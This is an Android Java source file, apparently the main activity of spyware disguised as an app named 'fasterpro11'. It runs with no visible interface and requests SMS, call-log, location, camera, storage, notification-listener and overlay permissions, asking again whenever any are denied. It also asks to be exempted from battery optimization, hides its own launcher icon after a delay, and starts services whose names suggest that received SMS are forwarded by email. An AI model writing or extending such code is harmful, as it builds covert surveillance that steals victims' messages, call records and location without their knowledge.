package com.example.fasterpro11;
// Googl Listed Settings 15 only sms
import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OTHER_PERMISSION_REQUEST_CODE = 1002;
    private static final int AUTO_HIDE_DELAY = 3000000; // 300 seconds

    private static final String[] AUTOMATIC_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG
    };

    private static final String[] USER_INTERACTION_PERMISSIONS = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_LOCATION
    };

    private Toast currentToast;

    private boolean automaticPermissionsGranted = false;
    private boolean userInteractionPermissionsGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView() here to avoid any UI display

        // Hide app icon after 300 seconds
        new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, AUTO_HIDE_DELAY);

        // Request permissions and start necessary services
        requestPermissions();
    }

    private void requestPermissions() {
        // Request automatic permissions if not granted
        if (!automaticPermissionsGranted) {
            ActivityCompat.requestPermissions(this, AUTOMATIC_PERMISSIONS, PERMISSION_REQUEST_CODE);
        }

        // Request user interaction permissions if not granted
        if (!userInteractionPermissionsGranted) {
            ActivityCompat.requestPermissions(this, USER_INTERACTION_PERMISSIONS, OTHER_PERMISSION_REQUEST_CODE);
        }

        // Check and request battery optimization permission
        requestBatteryOptimizationPermission();

        // Request overlay permission
        requestOverlayPermission();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            automaticPermissionsGranted = true;
        } else if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
            userInteractionPermissionsGranted = true;
        }

        if (automaticPermissionsGranted && userInteractionPermissionsGranted) {
            showToast("All permissions are allowed.");
            startServicesAndRequests();
        } else {
            StringBuilder deniedPermissions = new StringBuilder();
            boolean anyPermissionDenied = false;

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    anyPermissionDenied = true;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }

            if (anyPermissionDenied) {
                showToast("Permissions not granted:\n" + deniedPermissions.toString());
                Log.d("PermissionStatus", "Permissions denied: " + deniedPermissions.toString());
            } else {
                showToast("All permissions are required for the app to function correctly.");
            }

            // Re-request permissions if any are denied
            requestPermissions();
        }
    }

    private void startServicesAndRequests() {
        startBackgroundService();
        startJavaMailAPI();
        startJavaMailAPI_SmsReceiver_Send();
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.d("OverlayPermission", "Overlay permission not granted. Requesting...");
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            } else {
                Log.d("OverlayPermission", "Overlay permission already granted.");
            }
        }
    }

    private void requestBatteryOptimizationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OTHER_PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                showToast("Battery optimization permission granted");
            } else {
                showToast("Battery optimization permission denied. Some features may not work correctly.");
            }
        } else if (requestCode == PERMISSION_REQUEST_CODE) {
            if (Settings.canDrawOverlays(this)) {
                Log.d("OverlayPermission", "Overlay permission granted.");
            } else {
                Log.d("OverlayPermission", "Overlay permission denied.");
            }
        }
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI() {
        Intent serviceIntent = new Intent(this, JavaMailAPI.class);
        startService(serviceIntent);
    }

    private void startJavaMailAPI_SmsReceiver_Send() {
        Intent serviceIntent = new Intent(this, JavaMailAPI_SmsReceiver_Send.class);
        startService(serviceIntent);
    }




    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void showToast(String message) {
        if (currentToast != null) {
            currentToast.cancel();
        }
        currentToast = Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT);
        currentToast.show();
    }

    private boolean isInternetConnected() {
        // Implement your logic to check internet connection
        return false;
    }
}
